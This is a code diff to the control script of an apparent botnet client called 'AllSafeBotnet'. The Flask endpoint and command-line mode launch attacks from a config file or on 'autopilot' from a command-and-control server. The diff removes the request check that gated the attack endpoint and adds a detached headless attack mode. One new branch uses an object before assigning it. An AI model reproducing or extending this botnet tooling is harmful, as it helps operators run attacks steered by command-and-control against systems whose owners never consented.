@@ -57,39 +57,33 @@ set to False.
 @app.route("/submit", methods=['POST'])
 def performAttack():
     print(request.json)
-    if 'attack' in request.json:
-        if request.json['attack'] == 'begin':
-            # print("inizio")
-            # retrieving and polishing C&C server and prepare config file
-            if 'autopilot_start' in request.json:
-                allsafe = Botnet.AllSafeBotnet()
-                allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']),override=False)
-                return "OK", 200
+    # print("inizio")
+    # retrieving and polishing C&C server and prepare config file
+    if 'autopilot_start' in request.json:
+        allsafe = Botnet.AllSafeBotnet()
+        allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
+        return "OK", 200
 
-            # if not autopilot mode, we will experience a step-by-step attack session
-            # let we check for configuration file formatting...
-            try:
-                # prepare configuration
-                cc_server   = prepareConfigFile(request.json)
-                config_path = './data/current_attack.json'
-                # prepare botnet resources
-                allsafe = Botnet.AllSafeBotnet()
-                # if the attack to be carried without updates from C&C?
-                if 'local_attack' not in request.json:
-                    allsafe.attack(config_path, override=True)
-                # else we set to attack to be carried using updated configuration if any
-                else:
-                    if '://' not in cc_server:
-                        cc_server = 'http://' + cc_server
-                    allsafe.attack(config_path, override=False)
-            # return success
-                return "OK", 200
-            except Exception:
-                return "Invalid request", 402
+    # if not autopilot mode, we will experience a step-by-step attack session
+    # let we check for configuration file formatting...
+    try:
+        # prepare configuration
+        cc_server = prepareConfigFile(request.json)
+        config_path = './data/current_attack.json'
+        # prepare botnet resources
+        allsafe = Botnet.AllSafeBotnet()
+        # if the attack to be carried without updates from C&C?
+        if 'local_attack' not in request.json:
+            allsafe.attack(config_path, override=True)
+        # else we set to attack to be carried using updated configuration if any
         else:
-            return "Invalid request", 402
-    else:
-        return "Forbidden!", 403
+            if '://' not in cc_server:
+                cc_server = 'http://' + cc_server
+            allsafe.attack(config_path, override=False)
+            # return success
+        return "OK", 200
+    except Exception:
+        return "Invalid request", 402
 
 def prepareConfigFile(params, where='./data/current_attack.json'):
 
@@ -173,15 +167,27 @@ if __name__ == "__main__":
     print("  - Federico 'Elliot' Vagnoni                                ")
     print("-------------------------------------------------------------")
     # check for command line headless mode - autopilot(override=false)
-    if ('--remote' in sys.argv) and (len(sys.argv) >= 3):
-        try:
-            print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
-            cc_server = sys.argv[sys.argv.index('--remote') + 1]
-            print("- botnet C&C located at:", cc_server)
-            allsafe = Botnet.AllSafeBotnet()
-            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
-        except Exception:
-            print("Error entering autopilot mode!")
-            sys.exit(EnvironmentError)
+    if '--detach' in sys.argv:
+        if '--remote' in sys.argv:
+            try:
+                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
+                cc_server = sys.argv[sys.argv.index('--remote') + 1]
+                print("- botnet C&C located at:", cc_server)
+                allsafe = Botnet.AllSafeBotnet()
+                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
+            except Exception:
+                print("Error entering autopilot mode!")
+                sys.exit(EnvironmentError)
+        elif '--config' in sys.argv:
+            try:
+                print("[" + str(int(time())) + "]" + "starting headless attack, kill the process to abort...")
+                configuration = sys.argv[sys.argv.index('--config') + 1]
+                print("- botnet client configuration at:", configuration)
+                allsafe.autopilot("", configuration, 5, override=True)
+            except Exception:
+                print('Error entering autopilot mode - local configuration')
+                sys.exit(EnvironmentError)
+        else:
+            print("Usage: --detach [--remote <cc_server>] [--config <config_path>]")
     else:
         app.run(host='0.0.0.0', port=4042)
